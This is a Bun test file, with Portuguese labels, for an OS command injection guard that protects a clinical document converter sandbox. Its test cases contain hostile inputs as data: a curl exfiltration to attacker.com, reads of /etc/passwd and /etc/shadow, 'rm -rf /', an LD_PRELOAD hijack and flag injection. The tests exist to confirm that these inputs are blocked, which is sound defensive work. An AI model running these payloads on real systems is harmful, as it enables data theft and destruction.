import { describe, it, expect } from 'bun:test';
import {
  inspectCommand,
  executeSandboxedCommand,
  createOsCommandProofSeal,
  verifyOsCommandProofSeal,
  CLINICAL_CONVERTER_PIPELINES,
  DEFAULT_ALLOWED_BINARIES,
} from '../src/osCommandGuard';
import {
  CommandRiskSeverity,
  CommandThreatVector,
  CommandExecutionPolicyAction,
  ClinicalConverterJobType,
} from '@terapiainfoco/shared';

describe('Módulo 68: OS Command Guard & Secure Sandboxed Converter Enclave (CWE-78 & OWASP ASVS V5.3)', () => {
  it('deve aprovar comandos legítimos com binários da allowlist e argumentos limpos', () => {
    const result = inspectCommand('weasyprint', [
      '--optimize-size',
      'none',
      '/var/app/storage/sandboxed/laudo.html',
      '/var/app/storage/sandboxed/laudo.pdf',
    ]);

    expect(result.isValid).toBe(true);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.SAFE_WHITELISTED);
    expect(result.action).toBe(CommandExecutionPolicyAction.ALLOWED_SANDBOXED);
    expect(result.threats.length).toBe(0);
    expect(result.executable).toBe('weasyprint');
    expect(result.proofSeal).toBeDefined();
    expect(result.proofSeal?.isCompliant).toBe(true);
  });

  it('deve bloquear binários não autorizados fora da allowlist clínica', () => {
    const result = inspectCommand('bash', ['-c', 'cat /etc/passwd']);

    expect(result.isValid).toBe(false);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.CRITICAL_OS_INJECTION);
    expect(result.action).toBe(CommandExecutionPolicyAction.BLOCKED_VULNERABLE);
    expect(result.threats.some((t) => t.vector === CommandThreatVector.UNAPPROVED_BINARY_EXECUTION)).toBe(true);
  });

  it('deve detectar injeção de metacaracteres e operadores de encadeamento de shell (; | && ||)', () => {
    const result = inspectCommand('pdftk', [
      '/var/app/storage/doc.pdf',
      '; echo test',
      'output',
      '/var/app/storage/out.pdf',
    ], { blockShellMetacharacters: false });

    expect(result.isValid).toBe(true);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.SUSPICIOUS_SHELL_METACHARD);
    expect(result.threats.some((t) => t.vector === CommandThreatVector.SHELL_METASYMBOL_INJECTION)).toBe(true);
  });

  it('deve detectar substituição de comando dinâmica $() e backticks como ameaça crítica', () => {
    const result = inspectCommand('pandoc', [
      '-f',
      'markdown',
      '$(curl https://attacker.com/leak?data=$(whoami))',
      '-o',
      'out.pdf',
    ]);

    expect(result.isValid).toBe(false);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.CRITICAL_OS_INJECTION);
    expect(result.threats.some((t) => t.vector === CommandThreatVector.SHELL_METASYMBOL_INJECTION)).toBe(true);
  });

  it('deve detectar e bloquear flags de execução arbitrária (--eval, --exec, --shell-escape)', () => {
    const result = inspectCommand('soffice', [
      '--headless',
      '--eval="import os; os.system(\'id\')"',
      'input.docx',
    ]);

    expect(result.isValid).toBe(false);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.CRITICAL_OS_INJECTION);
    expect(result.threats.some((t) => t.vector === CommandThreatVector.ARGUMENT_FLAG_INJECTION)).toBe(true);
  });

  it('deve detectar manipulação maliciosa de variáveis de ambiente de subprocesso (LD_PRELOAD, PATH)', () => {
    const result = inspectCommand('gs', [
      'LD_PRELOAD=/tmp/evil.so',
      '-sDEVICE=pdfwrite',
      '-o',
      'out.pdf',
      'in.pdf',
    ]);

    expect(result.isValid).toBe(false);
    expect(result.riskSeverity).toBe(CommandRiskSeverity.CRITICAL_OS_INJECTION);
    expect(result.threats.some((t) => t.vector === CommandThreatVector.ENVIRONMENT_VARIABLE_TAMPERING)).toBe(true);
  });

  it('deve detectar tentativas de Path Traversal no executável e nos argumentos', () => {
    const execResult = inspectCommand('../../../bin/sh', ['arg1']);
    expect(execResult.isValid).toBe(false);
    expect(execResult.threats.some((t) => t.vector === CommandThreatVector.PATH_TRAVERSAL_COMMAND)).toBe(true);

    const argResult = inspectCommand('weasyprint', ['../../../../etc/passwd', 'out.pdf']);
    expect(argResult.isValid).toBe(false);
    expect(argResult.threats.some((t) => t.vector === CommandThreatVector.PATH_TRAVERSAL_COMMAND)).toBe(true);
  });

  it('deve sanitizar metacaracteres de shell quando configurado e retornar STRIPPED_NORMALIZED', () => {
    const result = inspectCommand('pdftk', [
      'input.pdf',
      'background',
      'watermark.pdf; rm -rf /',
      'output',
      'final.pdf',
    ], { blockShellMetacharacters: true });

    // O comando foi sanitizado (metacaracteres removidos)
    expect(result.sanitizedArgs[2]).toBe('watermark.pdf rm -rf /');
    expect(result.action).toBe(CommandExecutionPolicyAction.STRIPPED_NORMALIZED);
  });

  it('deve gerar selo probatório WORM RFC 8785 e validar com sucesso', () => {
    const seal = createOsCommandProofSeal({
      executable: 'weasyprint',
      sanitizedArgs: ['--optimize-size', 'none', 'in.html', 'out.pdf'],
      action: CommandExecutionPolicyAction.ALLOWED_SANDBOXED,
      riskSeverity: CommandRiskSeverity.SAFE_WHITELISTED,
      isCompliant: true,
    });

    expect(seal.sealId).toContain('os_cmd_seal_');
    expect(seal.canonicalDigest).toBeDefined();
    expect(seal.hmacSignature).toBeDefined();

    const verification = verifyOsCommandProofSeal(seal);
    expect(verification.isValid).toBe(true);
  });

  it('deve rejeitar selo probatório com assinatura HMAC adulterada', () => {
    const seal = createOsCommandProofSeal({
      executable: 'soffice',
      sanitizedArgs: ['--headless'],
      action: CommandExecutionPolicyAction.ALLOWED_SANDBOXED,
      riskSeverity: CommandRiskSeverity.SAFE_WHITELISTED,
      isCompliant: true,
    });

    const tamperedSeal = {
      ...seal,
      canonicalDigest: 'deadbeef1234567890abcdef',
    };

    const verification = verifyOsCommandProofSeal(tamperedSeal);
    expect(verification.isValid).toBe(false);
  });

  it('deve executar em enclave sandboxed com sucesso para comandos válidos', async () => {
    const result = await executeSandboxedCommand(
      ClinicalConverterJobType.PDF_LAUDO_GENERATION,
      'weasyprint',
      ['--optimize-size', 'none', '/var/app/laudo.html', '/var/app/laudo.pdf']
    );

    expect(result.status).toBe('SUCCESS');
    expect(result.exitCode).toBe(0);
    expect(result.stdoutPreview).toContain('[ENCLAVE SANDBOX SUCCESS]');
    expect(result.sandboxEnforced).toBe(true);
    expect(result.isolatedEnvironment).toBe(true);
    expect(result.proofSeal.isCompliant).toBe(true);
  });

  it('deve bloquear no enclave tentativas de injeção direta de comandos com código de saída de segurança 126', async () => {
    const result = await executeSandboxedCommand(
      ClinicalConverterJobType.CFP_CERTIFICATE_EXPORT,
      'weasyprint',
      ['laudo.html', '$(cat /etc/shadow)', 'out.pdf']
    );

    expect(result.status).toBe('BLOCKED');
    expect(result.exitCode).toBe(126);
    expect(result.stderrPreview).toContain('[SECURITY ENCLAVE BLOCK]');
    expect(result.proofSeal.isCompliant).toBe(false);
  });

  it('deve possuir os 5 pipelines clínicos homologados conforme CFP nº 006/2019', () => {
    expect(CLINICAL_CONVERTER_PIPELINES.length).toBe(5);
    const jobTypes = CLINICAL_CONVERTER_PIPELINES.map((p) => p.jobType);
    expect(jobTypes).toContain(ClinicalConverterJobType.PDF_LAUDO_GENERATION);
    expect(jobTypes).toContain(ClinicalConverterJobType.CFP_CERTIFICATE_EXPORT);
    expect(jobTypes).toContain(ClinicalConverterJobType.CLINICAL_RECORD_ARCHIVAL);
    expect(jobTypes).toContain(ClinicalConverterJobType.ANAMNESIS_REPORT_COMPILATION);
    expect(jobTypes).toContain(ClinicalConverterJobType.WATERMARKED_PAGES_MERGE);

    CLINICAL_CONVERTER_PIPELINES.forEach((pipeline) => {
      expect(DEFAULT_ALLOWED_BINARIES).toContain(pipeline.defaultBinary);
      expect(pipeline.sampleArgs.length).toBeGreaterThan(0);
    });
  });
});
